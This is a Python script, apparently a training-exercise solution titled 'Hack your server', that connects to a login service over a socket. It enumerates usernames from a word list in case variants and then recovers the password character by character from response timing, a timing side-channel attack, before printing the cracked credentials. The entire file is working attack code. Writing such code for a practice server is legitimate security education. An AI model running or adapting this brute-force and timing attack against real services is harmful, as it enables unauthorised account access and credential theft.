# write your code here
import argparse
import json
import os
import socket
import itertools
import string
import time


class SocketClient:
    def __init__(self, hostname, port):
        self.address = (hostname, port)
        self.socket = socket.socket()
        self.socket.connect(self.address)

    def check_login_name(self, login_name):
        self.socket.send(json.dumps(dict(login=login_name, password=' ')).encode())
        response = self.socket.recv(1024)
        response = json.loads(response.decode())
        if response.get("result") == "Wrong password!":
            return True
        else:
            return False

    def check_password(self, login_name, password):
        start_time = time.time()
        self.socket.send(json.dumps(dict(login=login_name, password=password)).encode())
        response = self.socket.recv(1024)
        end_time = time.time()
        response = json.loads(response.decode())
        if response.get("result") == "Connection success!":
            return True
        elif (end_time - start_time) >= 0.1:
            raise ValueError("Letter found")
        else:
            return False

    def connect(self):
        self.socket.connect(self.address)

    def close(self):
        self.socket.close()


def parse_command_line():
    parser = argparse.ArgumentParser(description="Hack your server")
    parser.add_argument('hostname', metavar='hostname', type=str)
    parser.add_argument('port', metavar='port', type=int)
    args = parser.parse_args()
    return args


def main():
    args = parse_command_line()
    my_hack = SocketClient(args.hostname, args.port)
    # filename = "{}{}logins.txt".format(os.getcwd(), os.path.sep)
    found_login_name = None
    with open("logins.txt", "r") as login_file:
        while True:
            line = login_file.readline()
            if not line:
                break
            line = line.strip()
            for login_name_set in itertools.product(*([letter.lower(), letter.upper()] for letter in line)):
                login_name = ''.join(login_name_set)
                if my_hack.check_login_name(login_name) is True:
                    found_login_name = login_name
                    break
            if found_login_name is not None:
                break
    my_list = string.ascii_letters + string.digits
    password_length = 1
    password = ""
    found_password = ''
    while True:
        need_continue = False
        for password_letter in my_list:
            try:
                if my_hack.check_password(found_login_name, password + password_letter) is True:
                    found_password = password + password_letter
                    break
            except ValueError:
                password += password_letter
                password_length += 1
                need_continue = True
                break
        else:
            password_length += 1
            continue
        if not need_continue:
            break
    my_hack.close()
    print(json.dumps(dict(login=found_login_name, password=found_password)))


if __name__ == "__main__":
    main()
